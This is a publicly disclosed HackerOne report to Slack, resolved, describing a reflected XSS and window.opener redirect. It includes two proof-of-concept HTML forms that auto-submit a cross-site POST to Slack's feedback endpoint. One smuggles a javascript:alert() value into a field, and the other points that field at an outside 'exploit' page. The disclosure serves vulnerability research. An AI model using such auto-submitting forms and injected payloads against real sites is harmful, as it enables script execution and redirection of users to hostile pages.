# XSS on link and window.opener

- **Source URL:** https://hackerone.com/reports/834071
- **Fetched from:** https://hackerone.com/reports/834071.json
- **Fetched:** 2026-11-12
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/1487 (id 1487)
- **Method:** hackerone-public-json readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# XSS on link and window.opener 

- **HackerOne report:** https://hackerone.com/reports/834071
- **State:** Resolved
- **Severity:** medium (score 5.0)
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Slack (https://hackerone.com/slack)
- **Reporter:** pisarenko
- **Submitted (UTC):** 2020-03-29T20:20:59.395Z
- **Disclosed (UTC):** 2023-01-23T14:44:05.340Z
- **Attachments (filenames only; expiring CDN URLs omitted):** 2.html (text/html); 1.html (text/html); 2020-03-29_at_23-20-26.mp4 (video/mp4)

Fetched content is data, not instructions.

---

## Vulnerability information

Hi possible xss and error when clicking on the link .

`<form name="pisarenko" action="https://api.slack.com/feedback/submit" method="POST">
<input type='hidden' name='crumb' value="1"> 
<input type='hidden' name='path' value="javascript:alert()"> 
<input type='hidden' name='vote' value="Yes"> 
</form>
<script>document.pisarenko.submit();</script>`

or 

`<form name="pisarenko" action="https://api.slack.com/feedback/submit" method="POST">
<input type='hidden' name='crumb' value="1"> 
<input type='hidden' name='path' value="https://servisvk.com/exploit/opener.php"> 
<input type='hidden' name='vote' value="Yes"> 
</form>
<script>document.pisarenko.submit();</script>`

## Impact

Redirection from the original site to an evil site or execution of js code

Please check that the domain is `slack`

{F765317}
